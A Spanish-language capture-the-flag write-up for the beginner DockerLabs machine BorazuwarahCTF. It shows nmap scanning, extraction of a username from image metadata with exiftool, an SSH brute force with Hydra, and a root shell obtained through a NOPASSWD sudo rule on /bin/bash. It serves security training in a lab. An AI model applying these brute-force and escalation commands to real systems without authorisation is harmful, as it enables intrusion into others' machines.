# 🖥️ **Máquina: BorazuwarahCTF**

- **🔹 Dificultad:** Muy Fácil  
- **📌 Descripción:**  
  *BorazuwarahCTF* es una máquina de práctica alojada en DockerLabs, diseñada para quienes se están iniciando en el pentesting. Permite practicar técnicas esenciales como fuerza bruta con Hydra, análisis de metadatos en imágenes y escalada de privilegios mediante `sudo`.

- **🎯 Objetivos:**  
  - Identificar credenciales mediante ataques de fuerza bruta.  
  - Extraer información sensible desde archivos públicos.  
  - Escalar privilegios en el sistema.

![Logo de BorazuwarahCTF](/BorazuwarahCTF/Imagenes/Logo.png)

---

## 🚀 **Despliegue de la Máquina en DockerLabs**

### 1️⃣ Despliegue automático  
Utiliza el siguiente comando para levantar la máquina:

```bash
sudo bash auto_deploy.sh borazwarabctf.tar
```

📌 *Nota: Asegúrate de tener Docker correctamente instalado y configurado.*

![Máquina Iniciada](/BorazuwarahCTF/Imagenes/Activar.jpeg)

Verifica la conectividad con un simple ping:

```bash
ping -c4 172.17.0.2
```

![Ping](/BorazuwarahCTF/Imagenes/Ping.jpeg)

---

## 🔍 **Fase de Reconocimiento**

### 🔎 Escaneo de Puertos  
Se realizó un escaneo rápido con `nmap` para identificar servicios expuestos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports.txt
```

**Puertos abiertos detectados:**  
- `22/tcp` (SSH)  
- `80/tcp` (HTTP)

![Resultado del Escaneo](/BorazuwarahCTF/Imagenes/Escaneo.jpeg)

### 🔧 Detección de Servicios  
Se utilizó un escaneo de servicios detallado:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN target.txt
```

**Resultados:**  
- **SSH:** OpenSSH 9.2p1  
- **HTTP:** Apache 2.4.59

![Servicios Detectados](/BorazuwarahCTF/Imagenes/Servicios.jpeg)

---

## 🌐 **Análisis del Sitio Web**

Se accedió al servidor web en el puerto 80, pero no se encontró contenido útil a primera vista. Se usaron herramientas como `gobuster`, `wfuzz` y `whatweb` sin revelar rutas o tecnologías adicionales destacables.  
Se observó una imagen disponible en el sitio, la cual fue analizada más adelante.

![Página Web](/BorazuwarahCTF/Imagenes/Pagina.jpeg)

---

## 🖼️ **Análisis de Imagen y Metadatos**

Se descargó la imagen del sitio web:

```bash
wget http://172.17.0.2/imagen.jpeg
```

Posteriormente, se examinó con `exiftool` para extraer metadatos:

```bash
exiftool imagen.jpeg
```

En los metadatos se encontró un **nombre de usuario**, lo cual sugiere un posible objetivo para fuerza bruta por SSH.

![Metadatos](/BorazuwarahCTF/Imagenes/Metadatos.jpeg)

---

## 🔓 **Explotación**

### 🚀 Ataque de Fuerza Bruta (SSH)

Se usó Hydra para encontrar la contraseña del usuario descubierto:

```bash
hydra -l borazunarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 20
```

**Credenciales válidas encontradas:**  
- **Usuario:** `borazunarah`  
- **Contraseña:** `123456`

![Hydra](/BorazuwarahCTF/Imagenes/Hydra.jpeg)

### 🧑‍💻 Conexión SSH

Con las credenciales obtenidas, se accedió al sistema:

```bash
ssh borazunarah@172.17.0.2
```

---

## 🛡️ **Escalada de Privilegios**

Una vez dentro, se verificaron los permisos con `sudo -l`:

```bash
sudo -l
```

**Resultado:**  
El usuario tiene permiso para ejecutar `/bin/bash` como root **sin contraseña**:

```
(ALL) NOPASSWD: /bin/bash
```

Por lo tanto, se escaló a root con:

```bash
sudo /bin/bash
```

![Escalada de Privilegios](/BorazuwarahCTF/Imagenes/SSH.jpeg)

---

## ✅ **Conclusiones**

*BorazuwarahCTF* es una máquina ideal para principiantes, que refuerza conceptos esenciales del hacking ético:

- 📌 **Reconocimiento**: identificación temprana de puertos y servicios.
- 🖼️ **Metadatos**: uso de `exiftool` para extraer información útil de archivos.
- 🔐 **Fuerza bruta**: aplicación efectiva de `hydra` para crackear credenciales.
- 🧑‍💻 **Escalada de privilegios**: explotación de configuraciones sudo mal implementadas.

🎯 **Lección clave**: incluso en entornos simples, una cadena de fallos básicos puede llevar rápidamente a una toma de control completa del sistema.
